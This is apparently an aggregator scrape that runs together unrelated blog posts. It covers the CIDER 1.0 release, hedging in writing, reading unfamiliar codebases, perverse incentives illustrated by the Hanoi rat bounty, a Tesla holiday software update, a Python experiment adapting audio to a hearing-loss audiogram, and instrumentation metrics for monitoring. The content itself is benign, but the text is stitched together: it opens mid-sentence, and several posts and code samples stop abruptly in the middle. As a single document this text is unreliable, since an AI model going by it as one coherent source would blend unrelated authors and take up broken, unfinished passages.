after a long period of hibernation. In hindsight probably the work
I did on nREPL was even more important than the work I did on CIDER.</p>

<p>Over the years a big ecosystem of packages grew around CIDER and nREPL
and they became important parts of the Clojure development
tooling. Today CIDER and nREPL face a lot of competition, but they are still
evolving at a steady pace, occasionally innovating, and serving as inspiration for
other tools. That makes me proud of the work we’ve done over the past 8 and a half years,
even if fewer and fewer people are using CIDER and Emacs every year.</p>

<p>One thing that constantly eluded me, however, was a 1.0 release. I
guess I’m the one to blame for this not happening sooner, as I had
some really grand ambitions for CIDER 1.0 (and some rather high
quality standards to go with them) and I was optimistic that somehow my plans would
become a reality in a reasonable amount of time.  Clearly I was
mistaken. Between me having to split my time between a dozen OSS projects
and most of them currently having no other active maintainers but me,
it eventually became obvious that the grand plans will have to wait
for CIDER 2.0. Grand plans and ambitions for world domination aside,
CIDER has been pretty stable for a while now and it seems to get the
job done. And there’s also the theory that if a piece of software has
some (happy) users then it qualifies for a 1.0 release… Oh, well…</p>

<p>Today the long wait is over - <a href="https://github.com/clojure-emacs/cider/releases/tag/v1.0.0">CIDER 1.0
(“Sofia”)</a>
is officially out!<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>  There’s nothing particularly interesting in this
release - it’s almost the same as CIDER 0.26. If you notice one
difference, it would probably be that commands that act on the symbol
at point (e.g. <code>cider-doc</code>) will no longer prompt you to confirm the
symbol. The old default was a mistake and I decided to adjust it for
this grand release. If you notice another difference, it’d probably be
that CIDER is officially using SemVer now. I still have to define
what exactly is going to constitute a breaking change going forward (e.g.
are changes to keybindings breaking changes?), but I’m reasonably
sure the adherence to SemVer will make CIDER upgrades less painful
for everyone.</p>

<p>There are many things that prompted me to do the 1.0 release now, but
probably the most important factor was that 2020 was such a horrible
year for all of us. I felt we needed all the good news we could
get to counter all the pain and suffering we’ve had to endure. While I
can’t help the fight against the pandemic, I hope I can cheer you up a
bit, by delivering another iteration of your favorite software that rocks.</p>

<p>So, what’s next? I don’t really have any particular plans for CIDER 1.1, so we’ll see how exactly it’s
going to shape up. Some vague ideas that have been floating in my mind are proper support for sideloading,
adding support for dynamic middleware loading, and improvements to the session management. No promises, though.
I’m also aiming to finally do an nREPL 1.0 release at some point. There are plenty of tickets
marked with the label “Good First Issue” on CIDER’s issue tracker, so if you’re looking for
more fun challenges after the end of the “Advent of Code” be my guest. I can definitely use all the help
I can get.</p>

<p>One thing is certain, though - CIDER will always stay true to its guiding principles:</p>

<ul>
  <li>REPL-first (as opposed to relying on static code analysis)</li>
  <li>Community-first (CIDER is defined by its community)</li>
  <li>Keep on rocking in a Lisp world!</li>
</ul>

<p>I’m writing this article while enjoying a bottle of proper (hard) French cider, so I think
I should wrap it up before I start enjoying myself too much.
Thanks to everyone who has been a part of CIDER’s community over the years! Thanks to everyone who has contributed to the project and supported it! Thanks
to everyone who still loves Emacs and CIDER! This release is for all of you!
Cheers!</p>

<p>Many writers cushion their prose with wads of fluff that imply that they are not willing to stand behind what they are saying.</p>
<p>Steven Pinker (from <a href="https://www.goodreads.com/book/show/20821371-the-sense-of-style">The Sense of Style</a>)</p>
</blockquote>
<p>When writing, I hedge. Safety cushions like "it seems," "perhaps," and "I think" are common in my writing. For example, in the post about <a href="https://marcel.is/comments-with-domain-knowledge/">domain comments</a> I conclude with: "All in all, <em>it seems to me</em> that if we adopt domain comments throughout the codebase, we accelerate the engineering pace. <em>Perhaps even</em> significantly."</p>
<p>The reason I hedge, I realized, is that I <em>generalize</em>. I write generic statements, but at the same time, I don't know if they are true, if they stand the test of time. Consider the example above: what if it turns out that domain comments do the opposite, that is, they slow down engineering? That would be unpleasant to find out. To protect myself, I end up hedging.</p>
<p>I want to stay open to changing my views. But I also want to stand behind what I write. So my writing is guided by two forces, each force pulling me in the opposite direction. This dissonance can be resolved, I realized: I need to omit generalizations and write about my <em>experience</em>. Experience, no matter what I discover later, cannot be disputed. It's always true, and so I can be confident about it. It is also true that experience can influence one's view. So I'm covered there as well.</p>
<p>There is another point to writing without generalization. The conclusion from the example above can be reformulated to: "We adopted domain comments and noticed that our engineering pace accelerated." I would love to write that, I truly do. But I cannot, I don't have arguments to back it up.  We didn't measure our speed. What we did was to discuss the <em>practice</em> of writing domain comments, and that's a different story. To remove hedging I would need to support the conclusion with arguments. Or I would need to make the conclusion different.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1609181702132/Jl1bi-T1p.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>A few weeks ago, a tweet made me take a second and think about something that I'd never consciously considered before; how can you approach an unfamiliar codebase and start to understand it?</p>

<p>It got me thinking about how I would approach a new repo that I'd never seen before but needed to make a contribution against, like a bug fix. I remembered my early days of learning <a target="_blank" href="https://kubernetes.io/">Kubernetes</a>, and wanting to make requests to the its API (because using the command line wasn't good enough for me, apparently). I had been trying to work out how to automatically deploy a particular branch of a GitLab repo into a cluster every time someone pushed to it. I had big ideas about automating DNS, setting up automated certificates, and adding a Slackbot to notify you whenever a new deploy happened.</p>
<p>If I remember correctly, I got a proof of concept working, and then it never went much past that. Given how popular <a target="_blank" href="https://www.cloudbees.com/gitops/what-is-gitops">GitOps</a> has become, maybe I should have stuck with it! When I started delving into the Kuberenetes side of the project, I was completely and utterly lost. The documentation didn't have much in the way of <em>how</em> to use the API (I'm sure nowadays things are much better), and reading the Kubernetes source code was a complete non-starter because well, that thing is a monster. I remember thinking to myself that I just needed to replicate what kubectl was doing to create a new Deployment.</p>
<p>So I gave up trying to read Kubernetes' source, and moved over to the <a target="_blank" href="https://github.com/kubernetes/kubectl">source for kubectl</a>. This is where I started to make some headway! I was able to follow straight from the <code>main()</code> function to the <code>apply</code> command, down through the logic until it started making API requests. It felt so good to finally get an answer, and to just import some Go packages to make it all work in short order!*</p>
<p>This is the background behind my answer to the tweet above:</p>

<p>Since that project years ago, I've sort of instinctively followed this strategy whenever I need to reason about a new codebase because well, it works! Only recently did this tweet make me think about it concretely, and I'm glad it did. I tried to replicate this purposefully to test my strategy. I went to a <a target="_blank" href="https://github.com/fluxcd/flux2">large open-source repo</a> and tried to find the code where it installed itself into a cluster. Using this strategy, I started with the tool's <code>main()</code> and then was able to find my way to the <code>install</code> command, which led me down to where the installation happens (funnily enough, by calling <code>kubectl</code>).</p>
<p>I think it's important for any developer to understand not only how to reason about an unfamiliar codebase, but also to realize that an important way that we learn is by trial and error. When we try something and it works, it brings us joy and we'll continue to do it, even if we don't realize it. I think it's a good idea to take a second to think about these moments when they happen, take a mental note of it so that next time you come across a similar problem, you can consciously use your previous learning and expand upon the strategies you've developed over time.</p>
<p>The reason I wanted to turn this tweet into a full blog post is because it made me realize that one of the goals for <a target="_blank" href="https://github.com/suborbital/atmo">Atmo</a> is to make it easier for developers to reason about applications. Since Atmo uses a declarative format for building backend applications (using WebAssembly modules), there is always one canonical entrypoint; the Directive. From there, you can easily reason about what the application is doing because it is <a target="_blank" href="https://stackoverflow.com/a/1784702">declarative instead of imperative</a>. This is one of the things that made Kubernetes so popular. Being able to describe your application in a simple format, and then have a system "make it happen" is a magical thing, and Atmo strives to do exactly that.</p>
<p>Atmo is gaining new functionality every week. If you want to learn more, check out <a target="_blank" href="https://suborbital.dev/">the Suborbital homepage</a></p>
<ul>
<li>When I say "short order", I'm sure it still took several days to get everything working, but once you unblock yourself on a big problem, everything after that just seems to fly by.</li>

<p>1902 was <a href="https://www.atlasobscura.com/articles/hanoi-rat-massacre-1902">a big year for rats</a> in Hanoi, Vietnam.</p>



<p>The city had spent the past few years building a city-wide sewer system, and toilets with running water became a symbol of progress and status. Of course, all those miles of underground sewage pipe were predator-free real estate for rats, so they multiplied.</p>



<p>When the rats got hungry, they’d follow the sewage lines to the surface. Those <a href="https://critter.blog/2020/12/07/spend-your-money-where-you-spend-your-time/">high status toilets</a> didn’t seem so desirable once rats started popping out, bringing everything from gross ickyness to bubonic plague.</p>



<p>So the government created a bounty program. Bring in the severed tail of a rat and get paid, simple as that. The Great Hanoi Rat Massacre picked up quickly, and at its peak, citizens killed over 20,000 rats in a single day. So far so good.</p>



<p>But <a href="https://critter.blog/2020/12/10/the-tragedy-of-the-commons-in-software-development/">people are greedy</a>. They started cutting the tails off and then releasing the rats back into the wild to breed. More breeding leads to more rats which leads to more tails which leads to more money. Simple economics. Some people even threw together makeshift rat breeding operations. </p>



<p>And just like that, Hanoi’s rat problem was worse than ever. </p>



<p>The rat bounty is an example of a <a href="https://en.wikipedia.org/wiki/Perverse_incentive">perverse incentive</a>. Whenever you see a reward that ends up encouraging the opposite of the behavior it was aiming for, you know you’ve got a perverse incentive on your hands.</p>



<p>The classic example in the development world is our friend <em>the velocity goal</em>. Misguided managers sometimes set a velocity goal in an effort to increase the productivity and value of the team. Usually it’s something like: “Let’s aim for 25 story points every sprint!” Or even worse, maybe it’s at an individual level: “Everyone aim for 10 story points per sprint!”</p>



<p>Of course people start “breeding rats” to game the system. They’ll over-inflate the estimates. They’ll tackle a ton of easy 1-pointer bug tickets instead of picking up the meatier work. They’ll do things <a href="https://critter.blog/2020/10/14/parkinsons-law-and-friends/">fast instead of right</a>. They’ll <a href="https://critter.blog/2020/10/05/guerrilla-productivity-tactics/">ignore their blocked coworkers</a> because they’re <a href="https://critter.blog/2020/12/10/the-tragedy-of-the-commons-in-software-development/">too focused on hitting their own goals</a>. This is not the way to increase the productivity and value of the team. A velocity goal is <a href="https://critter.blog/2020/12/22/power-in-naming-things/">a perverse incentive</a>. </p>



<p><a href="https://en.wikipedia.org/wiki/Goodhart%27s_law">Goodhart’s law</a> is one of my all time favorites. Here’s the simplified version:</p>



<blockquote><p>When a measure becomes a target, it ceases to be a good measure.</p></blockquote>



<p>Because remember, <a href="https://critter.blog/2020/11/12/velocity-doesnt-measure-value/">velocity</a> itself isn’t bad. It’s <a href="https://critter.blog/2020/08/20/plan-the-sprint-not-the-project/">useful for forecasting</a>, for example. But the second we turn the velocity measure into a target, it stops being a good measure. People game the system in an attempt to hit the target, and the value of the measure gets lost along the way.</p>



<p>Automated testing code coverage also comes to mind. As a measure, sure, it’s useful. But when a team decides something like “we need 80% code coverage” then it stops being useful. It doesn’t take long for the tail-less rats to start breeding. Then we’re left with tests that aren’t valuable but contribute to the coverage goal. </p>



<p>Those pointless tests take time to run and someone has to maintain them. So instead of making automated testing more useful, we’ve made it less useful. Perverse incentive. </p>



<p>It’s a sticky wicket, Goodhart’s law. Obviously, some things need to be targets, right? What is a company without goals? But how can we make sure we’re not creating perverse incentives? </p>



<p>The silver bullet is a ruthless adherence to <a href="https://critter.blog/2020/11/16/the-2-responsibilities-of-a-manager/">outcome-based goals</a> over output-based goals. Outcomes are what the business wants or needs to achieve. Outputs are the actions that help reach an outcome. We want goals to be based around what the business wants, not the steps we think will get us there. </p>



<p>Velocity goals and code testing coverage goals are <em>output</em> based. They’re the steps we think will get us to the outcomes we want. What are the <em>outcomes</em> we want? Let’s build the goals around those.  </p>

				<p><strong>tldr;</strong> Information retrieval is a critical part of creative work. Google's once awesome search product is now a tool of distraction.

<p>Tesla (TSLA) has come up with a holiday season gift for its customers by bringing more games and fun features with the latest over-the-air (OTA) software update version 2020.48.26 (firmware v10.2).</p>



<p>The newer <a href="https://www.teslaoracle.com/tag/v11-update/">major version update V11</a> has been delayed and is expected to roll out in the early weeks of 2021. However, this new holiday update packed new features and video games (release notes below).</p>



<p><a href="https://www.teslaoracle.com/">Tesla</a> has also played with the center touchscreen UI by moving some icons from the previous positions (check videos below) and has also added swipe functions to view additional information or visual components.</p>

<h2>Driving visualization improvements</h2>



<p>The driving visualization has been allotted a larger screen real estate but comparing with the FSD Beta visualizations, the display area is still relevantly small. Tesla describes the new visualization as:</p>



<blockquote><p>The driving visualization has been refreshed and now offers a larger visualization to allow drivers to view more details of the road surroundings. The next turn will now appear above the visualization if the navigation turn list is covered by another app.</p><p>Additionally, select items have slightly moved but will continue to look and behave the same. Some notable differences include the following:</p><p>– Quick access to the backup camera and wipers has moved to the bottom bar.</p><p>– Indicator lights have been moved to the side of the touchscreen.</p><p>– Autopilot set speed, Autopilot availability, and detected speed limit are now displayed next to the driving speed.</p><cite>Source: Tesla 2020.48.26 Release Notes</cite></blockquote>

<h3>Updated Santa Mode</h3>



<p>As part of the driving visualization improvement, Tesla has also enhanced the Santa Mode easter egg. Santa Mode basically turns your car into a Santa sleigh inside the driving visuals and the surrounding cars and other vehicles turn into reindeer, a perfect Christmas theme.</p>



<p>One <a href="https://www.teslaoracle.com/topic/model-3/">Tesla Model 3</a> owner has recorded this on Christmas day for fun, let’s watch.</p>

<h2>New video games</h2>



<p>Tesla 2020.48.26 update brings new games to enhance the in-car entertainment experience for <a href="https://www.teslaoracle.com/topic/model-s/">Tesla Model S</a>, 3, X, and <a href="https://www.teslaoracle.com/topic/model-y/">Y</a> owners. The Battle of Polytopia is a turn-based world-building strategy game that is one of Elon Musk’s favorites, now Tesla owners can play this while camping or Supercharging during the holiday season. Some also like to play in their garages, it’s totally fine.</p>



<blockquote><p><strong>The Battle of Polytopia</strong></p><p>The award-winning turn-based strategy game with low poly graphics. Lead your civilization to victory by expanding your empire and researching new technologies. To see how you compare with other Tesla owners, create a Tesla Arcade gamer name that will appear on the Battle of Polytopia Leaderboards.</p><p><amp-img width="740" height="463" src="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Battle-Polytopia.png" alt="Tesla in-car video game: The Battle of Polytopia." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Battle-Polytopia.png 740w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Battle-Polytopia-300x188.png 300w" sizes="(max-width: 740px) 100vw, 740px" layout="intrinsic" disable-inline-width="" data-amp-original-style="width: 600px;" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="463" src="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Battle-Polytopia.png" alt="Tesla in-car video game: The Battle of Polytopia." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Battle-Polytopia.png 740w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Battle-Polytopia-300x188.png 300w" sizes="(max-width: 740px) 100vw, 740px" data-amp-original-style="width: 600px;" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzQ2Mycgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></p><p><strong>Cat Quest</strong></p><p>Leap into a grand adventure of dragons, magic, and cats in purr-suit of the evil Drakoth and your catnapped sister.

<h2>Boombox</h2>



<p>Boombox combined with the new <a href="#fart-mode-2">Fart Mode 2.0</a> is perhaps the most interesting feature Tesla has deployed in this update. As Elon Musk said earlier, this update will include features that we don’t know we needed, very true. Boombox lets Tesla car owners add custom sounds to the car when driving, using Summon, parked outside in the crowd, or when pressing the horn.</p>



<figure><amp-img width="740" height="463" src="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Boombox.png" alt="Tesla Boombox feature released in the 2020.48.26 update." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Boombox.png 740w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Boombox-300x188.png 300w" sizes="(max-width: 740px) 100vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="463" src="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Boombox.png" alt="Tesla Boombox feature released in the 2020.48.26 update." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Boombox.png 740w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Boombox-300x188.png 300w" sizes="(max-width: 740px) 100vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzQ2Mycgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Tesla Boombox feature released  in the 2020.48.26 update.</figcaption></figure>



<p>Some owners really want to add customized audio messages when they press the horn, might be pretty useful in some scenarios when people just don’t seem to listen. The  release notes have the following description of this new feature:</p>



<blockquote><p>Turn your car into a boombox and entertain a crowd with your media player when parked. You can also customize the sound your car makes when you press the horn, drive the car or when your car is moving with Summon. Select an option from the dropdown menu or insert your own USB device and save up to five custom sounds.</p><cite>Source: Tesla 2020.48.26 Release Notes</cite></blockquote>

<h2>Emissions Testing Improvements (Fart Mode 2.0)</h2>



<p><a href="https://www.teslaoracle.com/topic/elon-musk/">Tesla CEO Elon Musk</a> just improvised on his greatest invention Fart Mode (self-proclaimed). Now besides being able to produce fart sounds from the car seats, Tesla owners will be able to fart at the pedestrians or even other cars (demo seen in the video above).</p>

<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/deafsign.png" title="Hear"></p><p><strong>WARNING: Some of the audios shared in this blog post may be disturbing and hurt your/your pet’s ears. Don’t play them at high volume.</strong> </p>
<p>I have a slight <a href="https://en.wikipedia.org/wiki/Sensorineural_hearing_loss" target="_blank" rel="noopener">sensorineural hearing loss</a> in both of my ears from birth. My hearing loss isn’t that serious but I need to use hearing aids in my daily life. Lately, I was thinking about altering my computer’s audio output according to my <a href="https://en.wikipedia.org/wiki/Audiogram" target="_blank" rel="noopener">audiogram</a>. An audiogram is basically a frequency-dB threshold graph. You can see my audiogram below:</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/audiogram.png" title="audiogram"></p>

<p>It’s easy to read an audiogram. In audiograms, 0 dB indicates the quietest sound that a normal young person can hear. Here, the red line shows my right ear’s threshold values and the blue one belongs to my left ear’s. Let’s follow the red line. According to my audiogram, at the frequency of 250 Hz, the lowest I can hear is the sounds at 25 dB. At 6000Hz, I can’t hear any sound below 60 dB. Audiograms usually show threshold dBs between 125 Hz and 8000 Hz because that is the frequency range of the human voice.</p>
<p>What I want to do is to add a dynamic gain to the output audio depending on its frequency range. Simply, I want to be able to use my computer without the need for my hearing aids. To achieve this, I’m going to write a <a href="https://ladspa.org/" target="_blank" rel="noopener">LADSPA</a> plugin and use it with <a href="https://www.freedesktop.org/wiki/Software/PulseAudio/" target="_blank" rel="noopener">Pulseaudio</a>. Here is my previous <a href="https://0x90.psaux.io/2020/12/07/How-To-Write-A-LADSPA-Plugin/">post</a> on how to write one. In this post, I won’t get into LADSPA, I’ll just talk about my explorations on some audio files. </p>
<p>Before we start you may want to read about <a href="https://en.wikipedia.org/wiki/Sampling_(signal_processing)" target="_blank" rel="noopener">sampling</a> and <a href="https://en.wikipedia.org/wiki/Fourier_transform" target="_blank" rel="noopener">fourier transform</a>. A better explanation of the fourier transform could be found <a href="http://www.jezzamon.com/fourier/index.html" target="_blank" rel="noopener">here</a>. </p>
<p>First, let’s generate audio from sine waves with frequencies from 440 Hz to 8000 Hz and a sample rate of 44100 Hz:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br></pre></td><td><pre><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>import</span> numpy <span>as</span> np</span><br><span></span><br><span><span><span>def</span> <span>generateSamples</span><span>(sampleRate)</span>:</span></span><br><span>    startFreq = <span>440</span> </span><br><span>    endFreq = <span>8000</span> </span><br><span></span><br><span>    freqInc = <span>20</span> </span><br><span>    incPeriod = <span>0.05</span> </span><br><span></span><br><span>    incSampleCount = int(sampleRate*incPeriod)</span><br><span>    samples = np.array([])</span><br><span></span><br><span>    freq = startFreq</span><br><span>    t = <span>0.0</span></span><br><span>    <span>while</span> freq &lt; endFreq:</span><br><span>        tarray = np.linspace(t, t + incPeriod, incSampleCount, endpoint=<span>False</span>)</span><br><span></span><br><span>        newSamples = np.sin(<span>2</span> * np.pi * freq * tarray)</span><br><span>        newSamples *= <span>0.05</span> </span><br><span></span><br><span>        samples = np.append(samples, newSamples)</span><br><span></span><br><span>        freq += freqInc</span><br><span>        t += incPeriod</span><br><span></span><br><span>    <span>return</span> samples</span><br><span></span><br><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    sampleRate = <span>44100</span></span><br><span></span><br><span>    samples = generateSamples(sampleRate)</span><br><span></span><br><span>    wavfile.write(<span>"generated.wav"</span>, sampleRate, samples)</span><br></pre></td></tr></tbody></table></figure>

<p>And the output is:</p>



<p>What we’re going to do is, first take a little part of the samples that we have generated. This will be our <em>window</em>. We’ll do a Fourier transform on this window and get into the frequency domain. Then we’ll find the frequency with the highest <a href="https://blog.demofox.org/2015/04/14/decibels-db-and-amplitude/" target="_blank" rel="noopener">dB</a> which will be our dominant frequency. We’ll determine how much gain is needed at that frequency according to the audiogram and apply it to the window. We’ll repeat this for all windows. We’re going to use <em>python</em> to achieve all this for the sake of convenience.</p>
<p><code>audiogram</code> variable keeps values of the above audiogram at the beginning of this post. <code>basedB</code> is rather an important variable. We’ll calculate our gain according to it. Let’s say, if we find that a window has a dominant frequency of 4000 Hz, then we need to apply <code>60.0 - 20.0 = 40.0 dB</code> gain to that window. It’s just the difference between how much normal people hear and how much I hear. That’s why the <code>basedB</code> variable should be chosen from the normal people’s hearing range.</p>

<p>Here is the function that will calculate dominant frequency. What it does is simple: it applies a fourier transform to the given window, finds the index of highest amplitude, and finally returns the corresponding frequency value.</p>

<p>And now the main part. Here you can see that, first, the <code>wav</code> file is loaded into memory as samples, then the samples are iterated over in chunks of <code>window</code> with the size of <code>1024</code>,  <code>getDominantFreq</code> and <code>getGain</code> functions are called on and a gain was applied to those <code>window</code>s accordingly. At the last step, the new samples are written into <code>processed.wav</code> file. </p>

<p>Now let’s run our code on the sine waves we’ve generated:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ python3 version1.py generated.wav</span><br></pre></td></tr></tbody></table></figure>



<p>We can see that higher gain is applied to higher frequencies which is what we want. Let’s try this in a real-world example. Now take a look at the little part of one of my favorite books: </p>



<p>Let’s run our code with this recording:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ python3 version1.py canticle_for_liebowitz.wav</span><br></pre></td></tr></tbody></table></figure>



<p>Damn. It hurts my ears. The problem  here is we’re applying gain even though it’s in my hearing range. For example, we shouldn’t add gain to 65 dB audio at any frequency. Also even if it’s out of my hearing range, we shouldn’t boost it too much. Let’s say if we have an audio with 55 dB at 4000 Hz, we shouldn’t amplify it to 85 dB which is too high. All we have to do is to shift it into my hearing range. </p>
<p>But what is 55 dB? For example, when we have an amplitude of 0.1, we can calculate the dB equivalent as <code>20 * log(0.1) = -20 dB</code>. Or we know 0 dB is full boost of the volume by <code>10^(0/20) = 1.0</code>. So, again, what the hell is 55 dB in “audiogram language” supposed to be?  </p>
<p>The answer lays in <strong>dB HL</strong> and <strong>dB SPL</strong>. HL stands for <em>Hearing Level</em> and SPL stands for <em>Sound Pressure Level</em>. dB SPL is basically the measurement of sound pressure. So the sound that makes no pressure is 0 dB and others are higher than 0 dB. Hearing levels are dB SPLs that are tailored for an audiogram. Do you remember in audiograms people’s hearing range starts from 0 dB? Well, that 0 dB HL is higher than 0 dB on the SPL scale and is different at every frequency because of how much the human ear hears. <a href="https://hearinglosshelp.com/blog/understanding-the-difference-between-sound-pressure-level-spl-and-hearing-level-hl-in-measuring-hearing-loss/" target="_blank" rel="noopener">Here</a> is a good reading on it.</p>
<p>There are many dB HL to dB SPL conversion charts. These conversions vary between the audiometers and the earphones used on those audiometers.</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/hl-to-spl.png" title="HL to SPL"></p><p>The problem here is I don’t know the standard of my audiogram’s calibration and I don’t know which earphones they have tested me with. So, we need to gather our own data. Let’s do our own hearing test! But this time we won’t be using dB SPL, we’ll just measure the usual dB values from my computer. The result will be specific to my computer but that’s fine. At least it’s going to be reliable. </p>
<p>Let’s create sine waves at the frequencies 125 Hz, 250 Hz, 500 Hz, 1000 Hz, 2000 Hz, 4000 Hz, and 6000 Hz with decreasing volume. Then, I’ll listen to the audio files and mark the last points I can hear something. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blog-article posted="2018-03-03T18:52:24Z"><p slot="summary">Instrumentation is the foundation of a monitoring infrastructure. It is the part that directly touches the system(s) being monitored, the source of raw data for our collectors and analyzers and dashboards. It is also the only part that is not under an SRE team's direct control – instrumentation is usually plumbed through the codebase by product teams. Given this, an SRE's primary source of leverage is to make adding instrumentation as easy and painless as possible. We do this by writing instrumentation libraries with friendly, approachable, idiomatic APIs.</p><blog-section><h2 slot="title">Metrics</h2><p>Each measurable property of the system is a <i>metric</i>. Repeated measurements of a metric's value yield a <a href="https://en.wikipedia.org/wiki/Time_series">time series</a> of <i>data samples</i>. A metric's definition includes metadata about how to collect, aggregate, and interpret its samples.</p><p>Metric values can in theory be of any serializable data type, but in practice they are numbers, text, or distributions:</p><ul><li>Numeric metrics may have an associated unit, ideally in a machine-readable annotation. This is most important for metrics where the "natural" definition of a unit is divisible, e.g. to record time intervals as an integral amount of milliseconds instead of a fractional amount of seconds.</li><li>Text metrics are most often constants, but are sometimes used for gauges if there's a small number of possible values.</li><li>Distributions are used for metrics with a very large set of possible values. They are usually visualized as a histogram or heat map.</li></ul><p>A C-style enumeration such as <code>enum { OPT_FOO = 1; OPT_BAR = 2; }</code> is best reported as <code>"OPT_FOO"</code> and <code>"OPT_BAR"</code><blog-footnote-ref>[<a href="#fn:1">1</a>]</blog-footnote-ref> instead of numeric <code>1</code> and <code>2</code>.</p><p>Booleans can be thought of as the enum <code>{ FALSE, TRUE }</code>. Some monitoring systems give them a separate type to simplify query planning and analysis.</p><p>Metrics can be defined ad-hoc at point of emission, or statically in some global type. I prefer statically declared metrics because that gives the opportunity to attach <a href="#metric-metadata">metric metadata</a>.</p><p>There are four common categories of metrics: constants, gauges, counters, and distributions<blog-footnote-ref>[<a href="#fn:2">2</a>]</blog-footnote-ref>.</p><blog-section><h3 slot="title">Constants</h3><p>A metric that does not change for the lifetime of its associated system component. Samples of a constant metric will always contain the same value. Common examples are build information (e.g. git commit ID), process start time, and process ID. Don't use constants for things that are only constant-ish, such as hostnames.</p><p>Constants can be text or numbers. For numbers, integers usually work better than floats (e.g. represent your start time as <code>int64 milliseconds</code> instead of <code>float64 seconds</code>.</p><table><thead><tr><th>Time</th><th><code>/build/timestamp</code> (seconds since UNIX epoch)</th><th><code>/build/revision_id</code></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr><tr><td>2011-12-13 14:16</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr><tr><td>2011-12-13 14:17</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr></tbody></table><p>In Go, using a constant metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

Think of them like tachometers.</p><p>Gauges can be text or numbers.</p><ul><li>Example integer gauges are memory allocation, thread count, active RPC count.</li><li>Example text gauges are mutable config settings (e.g. backend addresses), environment variables, and hostnames.</li></ul><table><thead><tr><th>Time</th><th><code>/proc/thread_count</code></th><th><code>/proc/working_directory</code></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>200</td><td>/var/www/current</td></tr><tr><td>2011-12-13 14:16</td><td>250</td><td>/var/www/previous</td></tr><tr><td>2011-12-13 14:17</td><td>230</td><td>/var/www/current</td></tr></tbody></table><p>In Go, using a gauge metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

Counters are almost always integers to avoid the implications of IEEE-754 rounding.</p><p>Example counter metrics are CPU microseconds spent, or the total request count.</p><p>Counters can only increase. If the metric collector sees that a new value is lower than the older value, it knows a <i>metric reset</i> has occurred. Resets happen when a process restarts, clearing in-memory state of the counter.</p><table><thead><tr><th>Time</th><th><code>/net/http/server/request_count</code></th><th></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>10000</td><td></td></tr><tr><td>2011-12-13 14:16</td><td>11000</td><td></td></tr><tr><td>2011-12-13 14:17</td><td>1500</td><td>RESET</td></tr></tbody></table><p>In Go, defining a counter metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

